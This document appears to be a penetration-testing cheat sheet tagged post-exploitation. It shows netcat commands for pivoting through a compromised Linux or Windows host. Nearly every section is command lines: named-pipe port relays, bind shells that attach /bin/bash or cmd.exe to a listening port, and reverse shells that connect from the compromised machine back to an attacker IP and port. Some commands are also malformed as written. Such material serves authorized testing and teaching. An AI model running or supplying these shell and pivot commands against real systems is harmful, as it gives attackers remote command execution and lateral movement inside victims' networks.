---
author(s):
  - Userware
tags:
  - post-exploitation
  - pivot
  - port-forward
  - scenarios
  - linux
  - windows
---
# Netcat

## 01 - Pivoting Listening Ports

Let's say you're stuck in a situation that there's no other way to perform pivoting except one of the netcat variants were preinstalled in the compromised Linux system.

```
$ mkfifo /tmp/backpipe

$ mknod /tmp/backpipe p

$ nc -lnvp <pivot_PORT> 0 < /tmp/backpipe | nc <bind_IP> <bind_PORT> 1 > /tmp/backpipe
```

## 02 - Scenarios

### 2.1 - Bind Port

#### 2.1.1 - Server-to-Client Relay

> [!INFO] Netcat Port Forwarding
> You can bind any exposed port to establish connection as long it works. Do not limit yourself to one specific service.

```
$ mknod /tmp/backpipe pipe; nc -lnvp 8443 0 < /tmp/backpipe | nc <webserver_IP> 443 1 > /tmp/backpipe
```

Create a proxy to interact a web server.

```
$ mknod /tmp/backpipe pipe; nc -lp 8080 0 & < /tmp/backpipe | tee -a inflow | nc <webserver_IP> <webserver_PORT> | tee -a outflow & 1 > /tmp/backpipe
```

Another way is to port forward through SSH then pipe it in the `netcat` listener.

```
$ mkfifo /tmp/backpipe pipe

$ while [ 1 ]; do nc -lp 8443 < /tmp/backpipe | ssh <ssh_server_IP> [-p <PORT>] "nc <webserver_IP> 80" | tee /tmp/backpipe; done
```

Then use `curl` to check connect to the pivot server.

```
userware@hackware-os:~$ curl -k http://<pivot_IP>:8443
```

### 2.2 - Port Forward Bind Shells

#### 2.2.1 - Server-to-Client Relay

Launch a listener from the compromised system.

```
user@computer:~$ nc -lp <target_PORT> -e /bin/bash

C:\> .\nc.exe -lp <target_PORT> -e cmd.exe
```

Bind the IP address and port from the compromised machine and redirect it with a listening port to create a pivot point.

```
user@pivot:~$ mknod /tmp/backpipe

user@pivot:~$ nc -lp <pivot_PORT> < /tmp/backpipe | nc <target_IP> <target_PORT> > /tmp/backpipe
```

Establish connection to the bind shell.

```
userware@hackware-os:~$ nc -v <pivot_IP> <pivot_PORT>
```

#### 2.2.2 - Server-to-Server Relay

Launch two listening ports one from the attacker side and the compromised system.

```
user@pivot:~$ mknod /tmp/backpipe

user@pivot:~$ nc -lp <pivot_PORT_1> < /tmp/backpipe | nc -lp <pivot_PORT_2> > /tmp/backpipe
```

Connect the IP address and port of the server to create a pivot point.

```
user@computer:~$ nc <pivot_IP> <pivot_PORT_2> -e /bin/bash

C:\> nc <pivot_IP> <pivot_PORT_2> -e cmd.exe
```

Establish connection to the bind shell.

```
userware@hackware-os:~$ nc -v <pivot_IP> <pivot_PORT_1>
```

### 2.3 - Port Forward Reverse Shells

#### 2.3.1 - Client-to-Server Relay

Launch the reverse shell handler in order to create a pivot point from the server.

```
userware@hackware-os:~$ nc -lnvp <attacker_PORT>
```

Connect the IP address and port of the attacker's machine to port forward a reverse shell handler.

```
user@pivot:~$ mknod /tmp/backpipe

user@pivot:~$ nc <attacker_IP> <attacker_PORT> < /tmp/backpipe | nc -lnvp <pivot_PORT> > /tmp/backpipe
```

Connect the server's IP address and port to prompt a reverse shell.

```
user@computer:~$ nc <pivot_IP> <pivot_PORT> -e /bin/bash

C:\> nc <pivot_IP> <pivot_PORT> -e cmd.exe
```

#### 2.3.2 - Client-to-Client Relay

Launch a listener from the compromised machine.

```
user@computer:~$ nc -lp <target_PORT> -e /bin/bash

C:\> nc -lp <target_PORT> -e cmd.exe
```

Prepare a shell handler to establish a reverse connection.

```
userware@hackware-os:~$ nc -lnvp <attacker_PORT>
```

Connect the two IP addresses and ports from the attacker machine and the compromised machine (respectively). You should have a reverse shell prompt.

```
user@pivot:~$ mknod /tmp/backpipe

user@pivot:~$ nc <attacker_IP> <attacker_PORT> < /tmp/backpipe | nc <target_IP> <target_PORT> > /tmp/backpipe
```

---
## References

### Michael Nikitochkin

- [Michael Nikitochkin: Netcat with SSH Port Forwarding](https://medium.com/notes-and-tips-in-full-stack-development/netcat-with-ssh-port-forwarding-148177b2e850)